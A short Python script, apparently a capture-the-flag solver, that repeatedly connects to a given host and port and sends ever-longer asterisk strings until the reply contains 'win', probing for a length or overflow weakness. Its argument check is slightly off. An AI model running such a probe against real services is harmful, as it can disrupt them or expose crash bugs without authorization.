import socket
import threading
import signal
import sys
from time import sleep

def cerrar(stack, outher):
    print("\nSaliendo...")
    exit(1)

if len(sys.argv) < 2:
    print("Usage: <URL> <PORT>")
    exit(1)

signal.signal(signal.SIGINT, cerrar)
host = sys.argv[1]
port = int(sys.argv[2])

def attack(chars):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
       try:
           s.connect((host, port))
           s.recv(1024)
           mensaje = chars + "\n"
           s.sendall(mensaje.encode())
           data = s.recv(1024).decode()
           return data if "win" in data else False
       except ConnectionRefusedError:
           print("No se pudo conectar al servidor. Asegúrate de que esté en ejecución.")
       except Exception as e:
           print(f"Ocurrió un error: {e}")

def main():
    print("Preparando...")
    chars = "*" 
    sleep(1)
    while True:
        print(f"Attack level: {len(chars)}",end="\r")
        victory_message = attack(chars)
        chars += "*"
        if victory_message:
            print("Yosh!!")
            print(victory_message)
            exit(0)


if __name__ == "__main__":
    main()

